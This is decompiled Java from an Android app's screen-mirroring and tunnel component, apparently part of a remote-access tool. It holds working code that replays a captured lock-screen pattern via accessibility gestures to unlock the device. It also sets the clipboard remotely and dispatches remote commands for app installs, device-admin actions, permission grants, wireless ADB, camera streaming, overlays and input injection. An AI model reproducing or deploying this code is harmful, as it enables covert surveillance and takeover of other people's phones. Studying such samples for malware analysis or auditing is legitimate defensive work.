// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Path;
import android.util.Log;
import java.io.IOException;
import java.io.OutputStream;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class ja implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f4357c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ Object f4358d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ int f4359e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final /* synthetic */ Object f4360f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final /* synthetic */ Object f4361g;

    public /* synthetic */ ja(cf cfVar, g2.d0 d0Var, int i3, g2.a0 a0Var) {
        this.f4357c = 4;
        this.f4358d = cfVar;
        this.f4360f = d0Var;
        this.f4359e = i3;
        this.f4361g = a0Var;
    }

    /* JADX WARN: Code duplicated, block: B:121:0x02ce A[Catch: IOException -> 0x02d3, TRY_LEAVE, TryCatch #1 {IOException -> 0x02d3, blocks: (B:115:0x02ae, B:117:0x02b2, B:119:0x02b8, B:121:0x02ce), top: B:200:0x02ae }] */
    @Override // java.lang.Runnable
    public final void run() throws Throwable {
        y.e eVarM;
        g2.c0 c0Var;
        String str;
        Runnable runnable;
        String str2;
        Runnable runnable2;
        String str3;
        boolean z2 = false;
        switch (this.f4357c) {
            case 0:
                ScreenMirrorService screenMirrorService = (ScreenMirrorService) this.f4358d;
                int i3 = this.f4359e;
                float[] fArr = (float[]) this.f4360f;
                float[] fArr2 = (float[]) this.f4361g;
                rd rdVar = ScreenMirrorService.n6;
                if (!screenMirrorService.J3()) {
                    screenMirrorService.f2501h2 = false;
                    Log.i("ScreenMirror", "[Unlock] sniffer capture: already unlocked, skip inject");
                    return;
                }
                Log.i("ScreenMirror", "[Unlock] sniffer capture: replaying captured path ms=" + i3);
                if (fArr.length < 2) {
                    screenMirrorService.P2();
                    return;
                }
                if (i3 < 180) {
                    i3 = 180;
                }
                if (i3 > 1400) {
                    i3 = 1400;
                }
                try {
                    int iE0 = ScreenMirrorService.e0((int) (fArr[0] * screenMirrorService.O3), screenMirrorService.O3);
                    int iE1 = ScreenMirrorService.e0((int) (fArr2[0] * screenMirrorService.P3), screenMirrorService.P3);
                    int iE2 = ScreenMirrorService.e0((int) (fArr[fArr.length - 1] * screenMirrorService.O3), screenMirrorService.O3);
                    int iE3 = ScreenMirrorService.e0((int) (fArr2[fArr2.length - 1] * screenMirrorService.P3), screenMirrorService.P3);
                    Path path = new Path();
                    path.moveTo(iE0, iE1);
                    for (int i4 = 1; i4 < fArr.length; i4++) {
                        path.lineTo(ScreenMirrorService.e0((int) (fArr[i4] * screenMirrorService.O3), screenMirrorService.O3), ScreenMirrorService.e0((int) (fArr2[i4] * screenMirrorService.P3), screenMirrorService.P3));
                    }
                    GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, i3)).build();
                    Log.i("ScreenMirror", "[Inject] PATTERN-CAPTURE points=" + fArr.length + " " + iE0 + "," + iE1 + "->" + iE2 + "," + iE3 + " ms=" + i3 + " locked=" + screenMirrorService.J3());
                    screenMirrorService.V0(screenMirrorService, e4.f3868c, gestureDescriptionBuild, new c2.a(1, screenMirrorService), null, new aa(screenMirrorService, 4), ScreenMirrorService.Z6, null, -1, 0L);
                    return;
                } catch (Throwable th) {
                    Log.w("ScreenMirror", "[Unlock] pattern capture inject fail: " + th.getMessage());
                    screenMirrorService.P2();
                    return;
                }
            case 1:
                ScreenMirrorService screenMirrorService2 = (ScreenMirrorService) this.f4358d;
                AtomicBoolean atomicBoolean = (AtomicBoolean) this.f4360f;
                p5 p5Var = (p5) this.f4361g;
                int i5 = this.f4359e;
                rd rdVar2 = ScreenMirrorService.n6;
                if (atomicBoolean.get() && p5Var.e() == 2 && atomicBoolean.compareAndSet(true, false)) {
                    Log.w("ScreenMirror", "[LockMask] screenshot callback missing; lease recovered");
                    screenMirrorService2.L6(i5);
                    return;
                }
                return;
            case 2:
                ScreenMirrorService screenMirrorService3 = (ScreenMirrorService) this.f4358d;
                String str4 = (String) this.f4360f;
                String str5 = (String) this.f4361g;
                int i6 = this.f4359e;
                rd rdVar3 = ScreenMirrorService.n6;
                screenMirrorService3.j6(i6, 0, str4, str5);
                return;
            case 3:
                ScreenMirrorService screenMirrorService4 = (ScreenMirrorService) this.f4358d;
                String str6 = (String) this.f4360f;
                OutputStream outputStream = (OutputStream) this.f4361g;
                int i7 = this.f4359e;
                rd rdVar4 = ScreenMirrorService.n6;
                try {
                    ClipboardManager clipboardManager = screenMirrorService4.d6;
                    if (clipboardManager == null) {
                        clipboardManager = (ClipboardManager) screenMirrorService4.getSystemService("clipboard");
                        screenMirrorService4.d6 = clipboardManager;
                    }
                    ClipboardManager clipboardManager2 = clipboardManager;
                    if (clipboardManager2 == null) {
                        throw new IllegalStateException("clipboard_service_unavailable");
                    }
                    ya yaVar = screenMirrorService4.e6;
                    if (yaVar != null) {
                        try {
                            clipboardManager2.removePrimaryClipChangedListener(yaVar);
                            z2 = true;
                        } catch (Throwable th2) {
                            Log.w("ScreenMirror", "[Ctrl] clipboard listener detach failed: " + th2.getMessage());
                        }
                    }
                    try {
                        clipboardManager2.setPrimaryClip(ClipData.newPlainText("screen-mirror-remote", str6));
                        if (z2 && screenMirrorService4.e6 == yaVar) {
                            try {
                                clipboardManager2.addPrimaryClipChangedListener(yaVar);
                            } catch (Throwable th3) {
                                Log.w("ScreenMirror", "[Ctrl] clipboard listener restore failed: " + th3.getMessage());
                            }
                            break;
                        }
                        Log.i("ScreenMirror", "[Ctrl] SET_CLIPBOARD len=" + str6.length() + " ok=true");
                        screenMirrorService4.F6(outputStream, i7, 25, 4, 100, 0, 0);
                        return;
                    } catch (Throwable th4) {
                        if (!z2 || screenMirrorService4.e6 != yaVar) {
                            throw th4;
                        }
                        try {
                            clipboardManager2.addPrimaryClipChangedListener(yaVar);
                            throw th4;
                        } catch (Throwable th5) {
                            Log.w("ScreenMirror", "[Ctrl] clipboard listener restore failed: " + th5.getMessage());
                            throw th4;
                        }
                    }
                } catch (Throwable th6) {
                    a0.a.p(th6, new StringBuilder("[Ctrl] SET_CLIPBOARD failed: "), "ScreenMirror");
                    screenMirrorService4.F6(outputStream, i7, 25, 3, 100, 0, 4);
                    return;
                }
            case 4:
                cf cfVar = (cf) this.f4358d;
                g2.d0 d0Var = (g2.d0) this.f4360f;
                int i8 = this.f4359e;
                g2.a0 a0Var = (g2.a0) this.f4361g;
                try {
                    try {
                        String strF0 = cf.f0(d0Var.f1577j);
                        Log.i("TunnelManager", "meta cmd: ".concat(strF0.length() > 160 ? strF0.substring(0, 160) + "… (" + strF0.length() + " chars)" : strF0));
                        s7 s7VarB = s7.b(strF0);
                        if (cfVar.O() && cf.M0(strF0) == null) {
                            eVarM = y.e.m("{\"ok\":false,\"error\":\"user_locked\"}");
                        } else {
                            if ("watch:video".equals(strF0)) {
                                cfVar.V();
                            } else if ("watch:webp".equals(strF0)) {
                                cfVar.W(i8, a0Var);
                            } else if ("watch:nodes".equals(strF0)) {
                                cfVar.X(i8, a0Var, 2);
                            } else if (s7VarB != null && s7VarB.f5056a == 1) {
                                cfVar.X(i8, a0Var, 3);
                            } else if (s7VarB != null && s7VarB.f5056a == 2) {
                                eVarM = cfVar.j0(i8, a0Var, s7VarB);
                            } else if (strF0.startsWith("telemetry:ping:")) {
                                eVarM = y.e.m(cf.M0(strF0));
                                if (eVarM == null) {
                                    try {
                                        try {
                                            Log.w("TunnelManager", "invalid telemetry ping nonce");
                                        } catch (IOException e3) {
                                            e = e3;
                                            y.e eVarM2 = y.e.m("{\"error\":\"" + e.getMessage() + "\"}");
                                            g2.c0 c0Var2 = d0Var.f1578k;
                                            if (eVarM2 != null && (str2 = (String) eVarM2.f5976c) != null) {
                                                c0Var2.write(str2.concat("\n").getBytes(StandardCharsets.UTF_8));
                                                c0Var2.flush();
                                                runnable2 = (Runnable) eVarM2.f5977d;
                                                if (runnable2 != null) {
                                                }
                                            }
                                            d0Var.close();
                                            return;
                                        }
                                        break;
                                    } catch (Throwable th7) {
                                        th = th7;
                                        try {
                                            c0Var = d0Var.f1578k;
                                            if (eVarM != null && (str = (String) eVarM.f5976c) != null) {
                                                c0Var.write(str.concat("\n").getBytes(StandardCharsets.UTF_8));
                                                c0Var.flush();
                                                runnable = (Runnable) eVarM.f5977d;
                                                if (runnable != null) {
                                                    cfVar.a0(75L, runnable);
                                                }
                                            }
                                            break;
                                        } catch (IOException unused) {
                                        }
                                        try {
                                            d0Var.close();
                                            throw th;
                                        } catch (IOException unused2) {
                                            throw th;
                                        }
                                    }
                                }
                            } else if (strF0.startsWith("grant-config:")) {
                                String strTrim = strF0.substring(13).trim();
                                Context context = cfVar.B0;
                                if (context != null) {
                                    f2.e0.b(context, strTrim);
                                } else {
                                    Log.w("TunnelManager", "grant-config but no app context");
                                }
                            } else if (strF0.startsWith("grant:")) {
                                cfVar.y(strF0.substring(6).trim());
                            } else if ("projection:off".equals(strF0)) {
                                eVarM = y.e.m(cfVar.D());
                            } else if (strF0.startsWith("admin:")) {
                                eVarM = cfVar.s(strF0.substring(6).trim());
                            } else if (strF0.startsWith("install:")) {
                                eVarM = y.e.m(cfVar.B(strF0.substring(8).trim()));
                            } else if ("watch:camera".equals(strF0)) {
                                cfVar.J = true;
                                if (cfVar.f()) {
                                    cfVar.d(cfVar.D);
                                } else {
                                    Log.w("TunnelManager", "camera push waiting for Socket.IO media registration");
                                }
                            } else if (strF0.startsWith("camera:lens:")) {
                                eVarM = y.e.m(cfVar.w(strF0.substring(12).trim()));
                            } else if (strF0.startsWith("camera:zoom:")) {
                                eVarM = y.e.m(cfVar.x(strF0));
                            } else if (strF0.startsWith("wireless_adb:")) {
                                eVarM = y.e.m(cfVar.G(strF0.substring(13).trim()));
                            } else if (strF0.startsWith("apps:")) {
                                eVarM = y.e.m(cfVar.v(strF0.substring(5).trim()));
                            } else if (strF0.startsWith("overlay:")) {
                                eVarM = y.e.m(cfVar.C(strF0.substring(8).trim()));
                            } else if (strF0.startsWith("reminder:")) {
                                eVarM = y.e.m(cfVar.E(strF0.substring(9).trim()));
                            } else if (strF0.startsWith("inject:")) {
                                eVarM = y.e.m(cfVar.A(strF0.substring(7).trim()));
                            } else {
                                Log.w("TunnelManager", "unknown meta cmd: ".concat(strF0));
                            }
                            eVarM = null;
                        }
                        g2.c0 c0Var3 = d0Var.f1578k;
                        if (eVarM != null && (str3 = (String) eVarM.f5976c) != null) {
                            c0Var3.write(str3.concat("\n").getBytes(StandardCharsets.UTF_8));
                            c0Var3.flush();
                            runnable2 = (Runnable) eVarM.f5977d;
                            if (runnable2 != null) {
                                cfVar.a0(75L, runnable2);
                            }
                        }
                        break;
                    } catch (IOException unused3) {
                    }
                } catch (IOException e4) {
                    e = e4;
                    eVarM = null;
                } catch (Throwable th8) {
                    th = th8;
                    eVarM = null;
                    c0Var = d0Var.f1578k;
                    if (eVarM != null) {
                        c0Var.write(str.concat("\n").getBytes(StandardCharsets.UTF_8));
                        c0Var.flush();
                        runnable = (Runnable) eVarM.f5977d;
                        if (runnable != null) {
                            cfVar.a0(75L, runnable);
                        }
                        break;
                    }
                    d0Var.close();
                    throw th;
                }
                try {
                    d0Var.close();
                    return;
                } catch (IOException unused4) {
                    return;
                }
            default:
                ((cf) ((g.j) this.f4358d).f1415d).P0(this.f4359e, (g2.a0) ((AtomicReference) this.f4360f).get(), (h2.e) this.f4361g);
                return;
        }
    }

    public /* synthetic */ ja(ScreenMirrorService screenMirrorService, Serializable serializable, Object obj, int i3, int i4) {
        this.f4357c = i4;
        this.f4358d = screenMirrorService;
        this.f4360f = serializable;
        this.f4361g = obj;
        this.f4359e = i3;
    }

    public /* synthetic */ ja(Object obj, int i3, Serializable serializable, Object obj2, int i4) {
        this.f4357c = i4;
        this.f4358d = obj;
        this.f4359e = i3;
        this.f4360f = serializable;
        this.f4361g = obj2;
    }
}
